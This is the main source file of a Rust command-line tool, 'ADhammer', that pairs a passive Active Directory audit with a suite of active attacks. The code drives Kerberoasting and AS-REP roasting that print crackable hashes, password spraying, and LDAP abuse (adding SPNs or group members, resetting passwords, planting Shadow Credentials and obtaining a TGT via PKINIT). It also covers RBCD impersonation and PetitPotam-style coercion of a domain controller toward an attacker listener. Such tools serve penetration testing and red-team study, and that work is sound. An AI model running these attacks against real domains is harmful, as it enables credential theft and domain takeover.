//! ADhammer — passive Active Directory security assessment (PingCastle-class), in Rust.
//! Pipeline: LDAP collect → build control-path graph → run checks → score → report.

use adhammer_collector::{Collector, LdapConfig};
use adhammer_graph::ControlGraph;
use adhammer_report::{Report, RiskConfig};
use anyhow::{Context, Result};
use clap::{Parser, Subcommand};

#[derive(Parser)]
#[command(name = "adhammer", version, about = "Passive AD security assessment in Rust")]
struct Cli {
    #[command(subcommand)]
    cmd: Command,
}

#[derive(Subcommand)]
enum Command {
    /// Passive audit: LDAP collection → control-path graph → 33 checks → scored report.
    Scan(ScanArgs),
    /// Read-only enumeration over RPC (SAMR users, LSAT name↔SID).
    #[command(subcommand)]
    Enum(EnumCmd),
    /// Active attacks: roasting, spraying, LDAP abuse, coercion, RBCD.
    #[command(subcommand)]
    Attack(AttackCmd),
}

#[derive(Subcommand)]
enum EnumCmd {
    /// Enumerate domain users over SAMR (SMB named pipe).
    Samr(SamrArgs),
    /// Resolve a name to its SID over LSAT (\lsarpc).
    Lsa(LsaArgs),
}

#[derive(Subcommand)]
enum AttackCmd {
    /// Kerberos AS-REP roast + Kerberoast (RC4/AES hashcat output).
    Roast(ScanArgs),
    /// Kerberos password spray / user enumeration.
    Spray(SprayArgs),
    /// LDAP abuse: add-spn / add-member / set-password / write-rbcd.
    Abuse(AbuseArgs),
    /// Coerce the DC to authenticate to a listener (PetitPotam / MS-EFSR).
    Coerce(CoerceArgs),
    /// RBCD: S4U2Self + S4U2Proxy to impersonate a user to a target service.
    Rbcd(RbcdArgs),
}

#[derive(Parser)]
struct RbcdArgs {
    #[arg(long)]
    kdc: String,
    #[arg(long)]
    realm: String,
    /// Controlled account (the RBCD trustee) sAMAccountName
    #[arg(long)]
    account: String,
    /// Controlled account password
    #[arg(long)]
    account_password: String,
    /// User to impersonate, e.g. Administrator
    #[arg(long)]
    impersonate: String,
    /// Target service SPN, e.g. cifs/dc01.testlab.local
    #[arg(long)]
    target_spn: String,
}

#[derive(Parser)]
struct CoerceArgs {
    #[arg(long)]
    host: String,
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    /// Attacker host the DC should authenticate to (UNC target)
    #[arg(long)]
    listener: String,
    /// Named pipe to try (lsarpc or efsrpc)
    #[arg(long, default_value = "lsarpc")]
    pipe: String,
}

#[derive(Parser)]
struct AbuseArgs {
    /// LDAP URL (required for the LDAP-write actions; unused by `pkinit`)
    #[arg(long)]
    url: Option<String>,
    #[arg(long)]
    user: Option<String>,
    #[arg(long)]
    password: Option<String>,
    #[arg(long)]
    insecure: bool,
    /// add-spn | add-member | set-password | add-keycred | write-rbcd | pkinit
    #[arg(long)]
    action: String,
    /// Target sAMAccountName (the object to modify; the group for add-member; the account
    /// to authenticate as for `pkinit`)
    #[arg(long)]
    target: String,
    /// Value: the SPN, member sAMAccountName, new password, RBCD trustee, or (for `pkinit`)
    /// the key .pem path — defaults to `<target>.key.pem`
    #[arg(long, default_value = "")]
    value: String,
    /// Kerberos realm (pkinit)
    #[arg(long)]
    realm: Option<String>,
    /// KDC host[:port] (pkinit)
    #[arg(long)]
    kdc: Option<String>,
}

#[derive(Parser)]
struct SprayArgs {
    /// KDC host[:port]
    #[arg(long)]
    kdc: String,
    /// Kerberos realm, e.g. TESTLAB.LOCAL
    #[arg(long)]
    realm: String,
    /// Users: comma-separated list, or @file with one per line
    #[arg(long)]
    users: String,
    /// Single password to spray across all users
    #[arg(long)]
    password: String,
}

#[derive(Parser)]
struct LsaArgs {
    #[arg(long)]
    host: String,
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    /// Name to resolve to a SID, e.g. Administrator
    #[arg(long)]
    name: String,
}

#[derive(Parser)]
struct SamrArgs {
    /// DC host or IP
    #[arg(long)]
    host: String,
    /// NetBIOS domain, e.g. TESTLAB
    #[arg(long)]
    domain: String,
    /// Username (sAMAccountName)
    #[arg(long)]
    user: String,
    /// Password
    #[arg(long)]
    password: String,
}

#[derive(Parser)]
struct ScanArgs {
    /// LDAP URL, e.g. ldap://dc.corp.local:389 or ldaps://dc.corp.local:636
    #[arg(long)]
    url: String,
    /// Bind identity: user@realm, DOMAIN\\user, or full DN
    #[arg(long)]
    user: String,
    /// Bind password
    #[arg(long)]
    password: String,
    /// Base DN (defaults to RootDSE defaultNamingContext)
    #[arg(long)]
    base_dn: Option<String>,
    /// Output format for `scan`
    #[arg(long, default_value = "json")]
    format: String,
    /// KDC host[:port] for `roast` to actually AS-REP roast (omit = list candidates only)
    #[arg(long)]
    kdc: Option<String>,
    /// SYSVOL path for `scan` to hunt GPP cpasswords, e.g. \\corp.local\SYSVOL
    #[arg(long)]
    sysvol: Option<String>,
    /// Skip TLS certificate verification (LDAPS against a self-signed / lab DC)
    #[arg(long)]
    insecure: bool,
    /// SASL GSSAPI bind (signed LDAP over 389 via ambient Kerberos; needs `--features gssapi`)
    #[arg(long)]
    gssapi: bool,
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt().with_target(false).init();
    let cli = Cli::parse();

    match cli.cmd {
        Command::Scan(a) => scan(a).await,
        Command::Enum(EnumCmd::Samr(a)) => samr(a).await,
        Command::Enum(EnumCmd::Lsa(a)) => lsa(a).await,
        Command::Attack(AttackCmd::Roast(a)) => roast(a).await,
        Command::Attack(AttackCmd::Spray(a)) => spray(a).await,
        Command::Attack(AttackCmd::Abuse(a)) => abuse(a).await,
        Command::Attack(AttackCmd::Coerce(a)) => coerce(a).await,
        Command::Attack(AttackCmd::Rbcd(a)) => rbcd(a).await,
    }
}

/// Full RBCD attack: S4U2Self + S4U2Proxy to obtain an impersonation ticket to the target.
async fn rbcd(a: RbcdArgs) -> Result<()> {
    let etype = adhammer_kerberos::rbcd_impersonate(
        &a.account, &a.account_password, &a.realm, &a.kdc, &a.impersonate, &a.target_spn,
    )
    .await?;
    println!("[+] got service ticket for {} as {} (enc-part etype {etype})", a.target_spn, a.impersonate);
    println!("    RBCD chain succeeded — impersonation ticket obtained.");
    Ok(())
}

/// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
async fn coerce(a: CoerceArgs) -> Result<()> {
    use adhammer_dcerpc::efsr::CoerceClient;
    use adhammer_smb::SmbClient;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe(&a.pipe).await?;

    let mut client = CoerceClient::bind(&mut smb, pipe).await?;
    match client.coerce(&a.listener).await {
        Ok(status) => {
            println!("[+] EfsRpcOpenFileRaw accepted via \\{} — status {status:#010x}", a.pipe);
            println!("    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
        }
        Err(e) => println!("[-] coercion via \\{} failed/patched: {e}", a.pipe),
    }
    Ok(())
}

/// Active LDAP abuse — the exploitation counterpart to the ACL findings the graph reports.
async fn abuse(a: AbuseArgs) -> Result<()> {
    // pkinit is a KDC exchange, not an LDAP write — handle it before touching LDAP.
    if a.action == "pkinit" {
        let realm = a.realm.clone().context("pkinit needs --realm")?;
        let kdc = a.kdc.clone().context("pkinit needs --kdc")?;
        let key_path = if a.value.is_empty() { format!("{}.key.pem", a.target) } else { a.value.clone() };
        let pem = std::fs::read_to_string(&key_path)
            .with_context(|| format!("read key {key_path}"))?;
        let tgt = adhammer_kerberos::pkinit::pkinit_authenticate(&a.target, &realm, &kdc, &pem).await?;
        let cc_path = format!("{}.ccache", a.target);
        std::fs::write(&cc_path, &tgt.ccache)?;
        println!("[+] PKINIT succeeded — TGT for {}@{} (via {})", a.target, realm, tgt.sname);
        println!("    reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key)");
        println!("    ticket valid until {}", tgt.end_time);
        println!("    ccache saved to {cc_path}  (export KRB5CCNAME={cc_path})");
        return Ok(());
    }

    let cfg = LdapConfig {
        url: a.url.clone().context("this action needs --url")?,
        bind_dn: a.user.clone().context("this action needs --user")?,
        password: a.password.clone().context("this action needs --password")?,
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    let target_dn = c.resolve_dn(&a.target).await?;

    match a.action.as_str() {
        "add-spn" => {
            c.add_value(&target_dn, "servicePrincipalName", &a.value).await?;
            println!("[+] added SPN '{}' to {} — now Kerberoastable", a.value, a.target);
        }
        "add-member" => {
            let member_dn = c.resolve_dn(&a.value).await?;
            c.add_value(&target_dn, "member", &member_dn).await?;
            println!("[+] added {} to group {}", a.value, a.target);
        }
        "set-password" => {
            c.set_password(&target_dn, &a.value).await?;
            println!("[+] reset password of {}", a.target);
        }
        "add-keycred" => {
            // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
            let kc = adhammer_kerberos::shadowcred::build_key_credential(&target_dn)?;
            c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary).await?;
            let key_path = format!("{}.key.pem", a.target);
            std::fs::write(&key_path, &kc.private_key_pem)?;
            println!("[+] added Shadow Credential to {} — key saved to {key_path}", a.target);
            println!("    (Phase 2: PKINIT with this key to obtain a TGT as {})", a.target);
        }
        "write-rbcd" => {
            // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
            let trustee = if a.value.starts_with("S-") {
                adhammer_core::sid::Sid::parse(&a.value).context("bad SID")?
            } else {
                c.resolve_sid(&a.value).await?
            };
            let sd = adhammer_sddl::build_rbcd_sd(&trustee);
            c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd).await?;
            println!("[+] wrote RBCD on {} allowing {} to impersonate to it", a.target, a.value);
        }
        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password|write-rbcd|add-keycred|pkinit)"),
    }
    Ok(())
}

/// Kerberos password spray: one password across a user list, classified by KDC response.
async fn spray(a: SprayArgs) -> Result<()> {
    use adhammer_kerberos::{check_credential, CredResult};

    let users: Vec<String> = if let Some(path) = a.users.strip_prefix('@') {
        std::fs::read_to_string(path)?.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty()).collect()
    } else {
        a.users.split(',').map(|u| u.trim().to_string()).filter(|u| !u.is_empty()).collect()
    };

    for u in &users {
        match check_credential(u, &a.password, &a.realm, &a.kdc).await {
            Ok(CredResult::Valid) => println!("[+] VALID           {u}:{}", a.password),
            Ok(CredResult::ValidButExpired) => println!("[+] VALID (expired) {u}:{}", a.password),
            Ok(CredResult::Disabled) => println!("[-] disabled/locked {u}"),
            Ok(CredResult::NoPreAuth) => println!("[*] AS-REP roastable {u} (no pre-auth)"),
            Ok(CredResult::Invalid) | Ok(CredResult::NoSuchUser) => {} // quiet
            Ok(CredResult::Other(c)) => eprintln!("    {u}: KDC error {c}"),
            Err(e) => eprintln!("    {u}: {e}"),
        }
    }
    Ok(())
}

/// LSAT name→SID over \lsarpc (SMB2 → NTLM → DCE/RPC → LsarOpenPolicy2 → LsarLookupNames).
async fn lsa(a: LsaArgs) -> Result<()> {
    use adhammer_dcerpc::lsat::LsatClient;
    use adhammer_smb::SmbClient;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe("lsarpc").await?;

    let mut client = LsatClient::bind(&mut smb, pipe).await?;
    let policy = client.open_policy().await?;
    match client.lookup_name(&policy, &a.name).await? {
        Some(sid) => println!("{} => {sid}", a.name),
        None => println!("{} => (not mapped)", a.name),
    }
    Ok(())
}

/// Full impacket-style path: SMB2 negotiate → NTLM session → IPC$ → \samr pipe →
/// DCE/RPC bind → SamrConnect → enumerate domain users.
async fn samr(a: SamrArgs) -> Result<()> {
    use adhammer_dcerpc::samr::SamrClient;
    use adhammer_smb::SmbClient;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    tracing::info!("SMB session established");
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe("samr").await?;
    tracing::info!("\\samr pipe open");

    let mut client = SamrClient::bind(&mut smb, pipe).await?;
    let users = client.enumerate_all_users(&format!("\\\\{}", a.host)).await?;
    println!("== SAMR users ({}) ==", users.len());
    for (rid, name) in users {
        println!("  {rid}\t{name}");
    }
    Ok(())
}

fn config(a: &ScanArgs) -> LdapConfig {
    LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: a.base_dn.clone(),
        insecure: a.insecure,
        gssapi: a.gssapi,
    }
}

async fn scan(a: ScanArgs) -> Result<()> {
    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    tracing::info!(objects = snap.objects.len(), "collected");

    let graph = ControlGraph::build(&snap);
    let stats = graph.stats();
    let paths = graph.paths_to_tier0();
    let mut findings = adhammer_checks::run_all(&snap, &graph);

    // Optional SYSVOL sweep: GPP cpasswords (MS14-025) + default-policy signing/NTLM.
    if let Some(sysvol) = &a.sysvol {
        let root = std::path::Path::new(sysvol);
        let hits = adhammer_sysvol::scan(root);
        tracing::info!(gpp = hits.len(), "sysvol GPP swept");
        if let Some(f) = adhammer_sysvol::finding(&hits) {
            findings.insert(0, f);
        }
        let policy = adhammer_sysvol::gptmpl::scan_policy(root);
        findings.extend(adhammer_sysvol::gptmpl::policy_findings(&policy));
    }

    let report = Report::build(
        &snap.domain.domain_dn,
        findings,
        paths,
        stats,
        &RiskConfig::default(),
    );

    match a.format.as_str() {
        "html" => println!("{}", report.to_html()),
        _ => println!("{}", report.to_json()),
    }
    Ok(())
}

async fn roast(a: ScanArgs) -> Result<()> {
    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    let realm = snap
        .domain
        .domain_dn
        .split(',')
        .filter_map(|p| p.strip_prefix("DC="))
        .collect::<Vec<_>>()
        .join(".")
        .to_uppercase();
    let (kerberoast, asrep) = adhammer_kerberos::candidates(&snap, &realm);

    println!("== Kerberoastable ({}) ==", kerberoast.len());
    match &a.kdc {
        None => {
            for c in &kerberoast {
                println!("  {}  spn={}", c.sam, c.spn.as_deref().unwrap_or("-"));
            }
        }
        Some(kdc) if !kerberoast.is_empty() => {
            // One authenticated TGT, then a TGS-REQ per SPN.
            match adhammer_kerberos::get_tgt(&a.user, &a.password, &realm, kdc).await {
                Err(e) => eprintln!("  TGT acquisition failed: {e}"),
                Ok(tgt) => {
                    for c in &kerberoast {
                        let spn = c.spn.as_deref().unwrap_or_default();
                        match adhammer_kerberos::roast_spn(&tgt, &c.sam, spn, kdc).await {
                            Ok(hash) => println!("{hash}"),
                            Err(e) => eprintln!("  {}: {e}", c.sam),
                        }
                    }
                }
            }
        }
        Some(_) => {}
    }

    println!("== AS-REP roastable ({}) ==", asrep.len());
    match &a.kdc {
        None => {
            for c in &asrep {
                println!("  {}", c.sam);
            }
            if !asrep.is_empty() {
                eprintln!("(pass --kdc <host> to fetch hashcat 18200 hashes)");
            }
        }
        Some(kdc) => {
            for c in &asrep {
                match adhammer_kerberos::asrep_roast(c, kdc).await {
                    Ok(hash) => println!("{hash}"),
                    Err(e) => eprintln!("  {}: {e}", c.sam),
                }
            }
        }
    }
    Ok(())
}
